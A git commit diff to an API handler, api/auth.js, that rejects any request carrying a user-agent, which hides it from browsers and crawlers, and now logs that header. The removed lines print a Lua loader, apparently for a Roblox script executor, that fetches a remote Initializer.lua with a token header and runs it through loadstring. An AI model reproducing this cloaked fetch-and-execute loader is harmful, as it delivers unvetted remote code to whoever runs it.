b2b719f5d534855171dd8ddf9f3d6359141e5203
92dhh728wmsk39djaqs <saripadajalel1@gmail.com>
2026-06-12 17:29:18 +0800

    Update auth.js

--- api/auth.js
+++ api/auth.js
@@ -1,28 +1,12 @@
 module.exports = function handler(req, res) {
   const ua = req.headers['user-agent'] || '';
 
-  // Block if a user-agent is present (browsers, crawlers, etc.)
+  // Temporary: log the UA to see what executors actually send
+  console.log('UA:', JSON.stringify(ua));
+
   if (ua !== '') {
     return res.status(403).send('Forbidden');
   }
 
-  const script = `
-local requestFunc = syn and syn.request or http and http.request or request
-
-if not requestFunc then
-  return error("Request function not found")
-end
-
-local response = requestFunc({
-  Url = "https://raw.githubusercontent.com/prsphecy/flow/refs/heads/main/Initializer.lua",
-  Method = "GET",
-  Headers = {
-    ["x-flow-token"] = "my_9aK2pX_flow_token"
-  }
-})
-
-loadstring(response.Body)()
-`;
-
-  res.status(200).send(script);
+  // ... rest of handler
 };
